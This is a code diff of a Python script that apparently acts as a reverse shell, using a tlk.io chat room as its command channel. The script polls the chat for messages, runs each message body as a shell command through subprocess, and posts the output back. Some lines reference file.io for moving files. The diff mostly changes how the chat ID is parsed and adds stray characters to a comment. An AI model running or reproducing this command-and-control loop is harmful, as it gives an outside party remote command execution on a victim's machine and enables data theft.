@@ -24,14 +24,18 @@ sess = requests.session()
 sess.post('https://tlk.io/api/participant', data={"nickname": "FuckSchool"})
 res = sess.get("https://tlk.io/reversshelltestforyoutube2")
 line = res.text.strip().split("\n")[382]
-chat_id = re.findall(".*\'(.*)\'.*", line)[0]
+pattern = r"Talkio\.Variables\.chat_id = '(\d+)'"
 
+# Search for the pattern in the text
+match = re.search(pattern, res.text)
+#chat_id="8853205"
+chat_id=match.group(1)
 
 while True:
     res = json.loads(sess.get(f"https://tlk.io/api/chats/{chat_id}/messages").text)
     #print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
     #print (type(res))
-    #print (len(res))
+    #print (len(res))kkkkkkkkkkkkkkkkkkkkk
     #print (res)
     #print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
     res = res[int(len(res)-1) : ]
@@ -58,6 +62,7 @@ while True:
                     res = res.replace('https://file.io','fileio')
             else:
                 res = subprocess.getoutput(message['body'])
+                #print("------>"+res)
             IDs.append(message['id'])
             sess.post(f"https://tlk.io/api/chats/{chat_id}/messages", data={'body': res, 'expired': 'false'})
     sleep(1)
